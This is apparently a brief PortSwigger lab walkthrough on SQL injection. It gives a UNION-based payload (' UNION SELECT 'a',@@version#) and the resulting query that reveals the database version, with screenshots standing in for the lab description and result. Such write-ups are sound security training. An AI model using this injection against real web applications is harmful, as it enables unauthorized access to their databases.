## Lab Description:

<img width="868" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/a1028afc-2fc6-4642-b4c6-513c2cd444ba">


## Solution:

Therefore I need to inject ' UNION SELECT 'a',@@version# to obtain the version information with the following query:

```SELECT * FROM someTable WHERE category='Pets' UNION SELECT 'a',@@version#'```

<img width="1281" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/9bf4f626-02cc-4709-81ed-b0fa291db071">

## Result:

<img width="1199" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/86f047f2-7821-49bc-a778-c1f0e29e734f">
